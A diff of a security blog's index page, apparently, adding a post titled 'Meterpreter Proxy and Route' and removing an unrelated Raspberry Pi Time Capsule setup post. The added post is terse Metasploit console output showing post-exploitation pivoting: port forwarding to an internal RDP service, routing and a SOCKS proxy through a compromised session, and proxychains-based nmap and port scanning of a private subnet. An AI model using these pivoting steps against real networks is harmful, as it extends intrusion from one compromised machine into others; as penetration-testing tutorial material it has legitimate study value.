@@ -263,6 +263,124 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/02/Meterpreter-Proxy-and-Route/" itemprop="url">
+                  Meterpreter Proxy and Route
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-02T00:49:27+08:00">
+                2017-01-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-portfwd"><a href="#0x01-portfwd" class="headerlink" title="0x01 portfwd"></a>0x01 portfwd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.0.105 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.0.105:3389</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote              Direction</span><br><span class="line">   -----  -----         ------              ---------</span><br><span class="line">   1      0.0.0.0:1234  192.168.0.105:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line">&gt; rdesktop 127.1.1.0:1234</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-pivot"><a href="#0x02-pivot" class="headerlink" title="0x02 pivot"></a>0x02 pivot</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(web_delivery) &gt; route add 192.168.0.0 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(web_delivery) &gt; route</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.0.0        255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">msf exploit(web_delivery) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Type                    Information              Connection</span><br><span class="line">  --  ----                    -----------              ----------</span><br><span class="line">  1   meterpreter python/osx  xl7dev  192.168.0.105:4444 -&gt; 192.168.0.105:50834 (192.168.0.105)</span><br><span class="line">msf exploit(web_delivery) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line">msf auxiliary(socks4a) &gt; exploit -y</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">&gt; vi /etc/proxychains.conf</span><br><span class="line">socks4  127.0.0.1 1080</span><br><span class="line">&gt; proxychains4 nmap -sT -Pn 192.168.0.100</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-autoroute"><a href="#0x03-autoroute" class="headerlink" title="0x03 autoroute"></a>0x03 autoroute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.1/24</span><br><span class="line">[*] Adding a route to 192.168.0.1/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.0.1/255.255.255.0 via 192.168.0.105</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf auxiliary(web_delivery) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/28/Dumping-Memory-on-iOS/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1348,128 +1466,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/22/Raspberry-pi-as-time-capsule/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/22/Raspberry-pi-as-time-capsule/" itemprop="url">
-                  Respberry pi as time capsule
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-22T11:04:39+08:00">
-                2016-10-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-lists"><a href="#0x01-lists" class="headerlink" title="0x01 lists"></a>0x01 lists</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">respberry pi 2B</span><br><span class="line">My Passport Ultra 2T hfs+</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-install"><a href="#0x02-install" class="headerlink" title="0x02 install"></a>0x02 install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hfsplus hfsutils hfsprogs</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install git git-core –y</span><br><span class="line">pi@raspberrypi:~ $ sudo git clone git://git.drogon.net/wiringPi</span><br><span class="line">pi@raspberrypi:~ $ cd wiringPi &amp;&amp; sudo ./build</span><br><span class="line">pi@raspberrypi:~ $ gpio –g read 38</span><br><span class="line">0</span><br><span class="line">pi@raspberrypi:~ $ gpio -g write 38 1</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ gpio -g read 38</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ sudo blkid</span><br><span class="line">/dev/mmcblk0p1: SEC_TYPE=&quot;msdos&quot; LABEL=&quot;boot&quot; UUID=&quot;86EA-017B&quot; TYPE=&quot;vfat&quot; PARTUUID=&quot;ea0e7380-01&quot;</span><br><span class="line">/dev/mmcblk0p2: UUID=&quot;ad6203a1-ec50-4f44-a1c0-e6c3dd4c9202&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;ea0e7380-02&quot;</span><br><span class="line">/dev/sda1: UUID=&quot;a10e864b-92bd-39ac-ae75-cf5a26ee8107&quot; LABEL=&quot;My Passport&quot; TYPE=&quot;hfsplus&quot; PARTUUID=&quot;28d26e49-01&quot;</span><br><span class="line">/dev/mmcblk0: PTUUID=&quot;ea0e7380&quot; PTTYPE=&quot;dos&quot;</span><br><span class="line">pi@raspberrypi:~ $ sudo /sbin/parted</span><br><span class="line">GNU Parted 3.2</span><br><span class="line">Using /dev/sda</span><br><span class="line">Welcome to GNU Parted! Type &apos;help&apos; to view a list of commands.</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">(parted) print</span><br><span class="line">Model: WD My Passport 0837 (scsi)</span><br><span class="line">Disk /dev/sda: 2000GB</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags:</span><br><span class="line"></span><br><span class="line">Number  Start   End     Size    Type     File system  Flags</span><br><span class="line"> 1      1049kB  2000GB  2000GB  primary  hfs+         boot</span><br></pre></td></tr></table></figure>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo mkdir -p /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo vim /etc/fstab</span><br><span class="line"># line to add to fstab</span><br><span class="line">/dev/sda1       /media/TimeCapsule   hfsplus force,rw,user,auto  0   0</span><br><span class="line">pi@raspberrypi:~ $ sudo mount -t hfsplus -o force /dev/sda1 /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo chown -R pi:pi /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install netatalk</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/netatalk/AppleVolumes.default</span><br><span class="line">#~/			&quot;Home Directory&quot;</span><br><span class="line">/media/TimeCapsule &quot;Time Capsule&quot; options:tm</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service netatalk restart</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install avahi-daemon libnss-mdns</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/nsswitch.conf</span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns</span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns mdns4  mdns</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /etc/avahi/services/afpd.service</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&apos;no&apos;?&gt;&lt;!--*-nxml-*--&gt;</span><br><span class="line">&lt;!DOCTYPE service-group SYSTEM &quot;avahi-service.dtd&quot;&gt;</span><br><span class="line">&lt;service-group&gt;</span><br><span class="line">    &lt;name replace-wildcards=&quot;yes&quot;&gt;%h&lt;/name&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_afpovertcp._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;548&lt;/port&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_device-info._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;0&lt;/port&gt;</span><br><span class="line">        &lt;txt-record&gt;model=TimeCapsule&lt;/txt-record&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">&lt;/service-group&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /usr/local/etc/afp.conf</span><br><span class="line">[Global]</span><br><span class="line">  mimic model = TimeCapsule6,106</span><br><span class="line"></span><br><span class="line">[Time Machine 2TB]</span><br><span class="line">  path = /media/TimeCapsule</span><br><span class="line">  time machine = yes</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service avahi-daemon start</span><br><span class="line">pi@raspberrypi:~ $ sudo service netatalk start</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d avahi-daemon defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d netatalk defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hdparm</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/hdparm.conf</span><br><span class="line">command_line &#123;</span><br><span class="line">  hdparm -S 240 /dev/sda</span><br><span class="line">&#125;</span><br><span class="line">pi@raspberrypi:~ $ sudo reboot</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1515,7 +1511,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">71</span>
+              <span class="site-state-item-count">72</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1525,7 +1521,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
@@ -1631,7 +1627,7 @@
         <div class="copyright" >
   
   &copy;  2015 - 
-  <span itemprop="copyrightYear">2016</span>
+  <span itemprop="copyrightYear">2017</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
